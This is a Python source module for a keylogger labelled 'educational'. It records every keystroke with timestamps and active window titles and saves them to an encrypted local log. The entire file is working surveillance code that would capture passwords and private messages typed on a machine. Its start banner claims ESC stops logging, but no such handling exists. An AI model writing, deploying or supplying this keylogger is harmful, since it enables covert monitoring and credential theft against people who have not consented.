from pynput import keyboard
import threading
import time
from datetime import datetime
from src.encryption import LogEncryptor
import os
import json

class EducationalKeylogger:
    def __init__(self, config):
        self.config = config
        self.encryptor = LogEncryptor(config['encryption_key_file'])
        self.log_buffer = []
        self.buffer_size = 50  # Flush after 50 keystrokes
        self.current_window = "Unknown"
        self.lock = threading.Lock()
        self.running = True
        
    def get_active_window(self):
        """Get current active window title (Windows)"""
        try:
            import win32gui
            window = win32gui.GetForegroundWindow()
            return win32gui.GetWindowText(window)
        except:
            return "Window tracking unavailable"
    
    def on_press(self, key):
        """Callback for key press events"""
        if not self.running:
            return False
        
        try:
            # Handle special keys
            if hasattr(key, 'char') and key.char is not None:
                log_entry = key.char
            else:
                # Special key mapping
                special_keys = {
                    keyboard.Key.space: ' ',
                    keyboard.Key.enter: '\n[ENTER]\n',
                    keyboard.Key.tab: '\t[TAB]\t',
                    keyboard.Key.backspace: '[BACKSPACE]',
                    keyboard.Key.delete: '[DELETE]',
                    keyboard.Key.shift: '[SHIFT]',
                    keyboard.Key.ctrl_l: '[CTRL]',
                    keyboard.Key.ctrl_r: '[CTRL_R]',
                    keyboard.Key.alt_l: '[ALT]',
                    keyboard.Key.alt_r: '[ALT_R]',
                    keyboard.Key.cmd: '[WIN]',
                    keyboard.Key.up: '[UP]',
                    keyboard.Key.down: '[DOWN]',
                    keyboard.Key.left: '[LEFT]',
                    keyboard.Key.right: '[RIGHT]',
                }
                log_entry = special_keys.get(key, f'[{str(key)}]')
            
            # Add timestamp and window context
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
            window = self.get_active_window()
            
            formatted_log = f"[{timestamp}] [{window}] {log_entry}"
            
            with self.lock:
                self.log_buffer.append(formatted_log)
                if len(self.log_buffer) >= self.buffer_size:
                    self.flush_logs()
                    
        except Exception as e:
            print(f"Error logging key: {e}")
    
    def flush_logs(self):
        """Write buffered logs to encrypted file"""
        if not self.log_buffer:
            return
        
        try:
            log_text = '\n'.join(self.log_buffer) + '\n'
            self.log_buffer = []
            
            # Read existing encrypted logs
            existing_logs = ""
            if os.path.exists(self.config['log_file']):
                with open(self.config['log_file'], 'r') as f:
                    encrypted_content = f.read()
                    if encrypted_content:
                        existing_logs = self.encryptor.decrypt(encrypted_content)
            
            # Append new logs
            updated_logs = existing_logs + log_text
            
            # Encrypt and save
            encrypted = self.encryptor.encrypt(updated_logs)
            with open(self.config['log_file'], 'w') as f:
                f.write(encrypted)
                
        except Exception as e:
            print(f"Error flushing logs: {e}")
    
    def start(self):
        """Start the keylogger"""
        print("[!] EDUCATIONAL KEYLOGGER STARTED - Logging will be encrypted")
        print(f"[!] Logs saved to: {self.config['log_file']}")
        print("[!] Press ESC to stop logging")
        
        listener = keyboard.Listener(on_press=self.on_press)
        listener.start()
        
        # Auto-flush every 30 seconds
        while self.running:
            time.sleep(30)
            with self.lock:
                self.flush_logs()
        
        listener.stop()
        self.flush_logs()  # Final flush
    
    def stop(self):
        """Stop the keylogger"""
        self.running = False
        print("\n[!] Keylogger stopped")